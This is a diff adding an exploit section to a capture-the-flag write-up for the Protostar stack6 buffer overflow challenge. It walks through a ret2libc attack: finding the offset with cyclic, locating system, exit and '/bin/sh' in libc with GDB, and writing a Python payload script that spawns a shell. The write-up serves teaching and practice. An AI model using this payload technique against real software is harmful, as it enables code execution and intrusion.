@@ -37,7 +37,7 @@ int main(int argc, char **argv)
 
 - This challenge has no-pie, no stack protector, rwx segment.
 
-![img](/assets/checksec.png)
+![img](/protostar/stack6/assets/checksec.png)
 
 - At first, we can see that the program has buffer overflow vulnerability (1), so we can overwrite on the stack. But we can't overwrite getpath()'s address to another address on the stack that allow us to return to, so we can't use return to shellcode on stack to take control of target.
  
@@ -73,3 +73,62 @@ int main(int argc, char **argv)
 
 ### Exploit
 
+- Let's find:
+  + Size of bytes to overwrite until we can overwrite return the getpath() functions's address.
+  + System() function's address to implement CLI command to take the shell.
+  + Exit() function's address to exit the program when we done, but you can alter this with garbage value to fill up 4 bytes, like "aaaa" or somethings else.
+  + Address to "/bin/sh" char*.
+
+> # Note: ASLR must be turn off, if it's on, the address will be randomize every time we run the program
+>
+> ![img](/protostar/stack6/assets/aslr_off.png)
+>
+
+#### Offset to overwrite
+
+- I use cyclic from pwntools to find the offset that we must overwrite
+
+![img](/protostar/stack6/assets/cyclic.png)
+
+![img](/protostar/stack6/assets/input.png)
+
+- After do that, we find the offset to overwrite
+
+![img](/protostar/stack6/assets/offset.png)
+
+#### System and Exit function's address
+
+- In GDB, I use `p system` and `p exit` to find the address of system and exit function
+
+![img](/protostar/stack6/assets/system_exit.png)
+
+> # Note: we can see that both system and exit function are in libc
+
+#### Finding "/bin/sh"
+
+- The `int system(char *command)` take 1 argument that is the shell command, so we also find "/bin/sh" string.
+
+- We can use `find address_begin, address_end string_to_find` to find characters in string in range between address begin and end. But it's not in a specific ordered.
+
+- But when the program is running, it link the libc to use build-in function. So we can find "/bin/sh" in this linked libc. In this program is /lib/libc-2.11.2.so with offset is 11f3bf
+
+![img](/protostar/stack6/assets/offset_binsh.png)
+
+- Finally, address of "/bin/sh" when program is running is calculated by `offset_binsh + libc_base_address = 0x11f3bf + 0xb7e97000 = 0xb7fb63bf`.
+
+- So, We found all things to exploit the program, let's use python to write some script.
+
+```python
+# file name: exp.py
+
+padding = "a"*80
+fake_ret = "a"*4
+sys_addr = "\xb0\xff\xec\xb7"
+binsh_addr = "\xbf\x63\xfb\xb7"
+
+payload = ""
+payload += padding + sys_addr + fake_ret + binsh_addr
+print(payload)
+
+# python exp.py > temp.pwn && (cat temp.pwn; cat) | ./stack6
+```
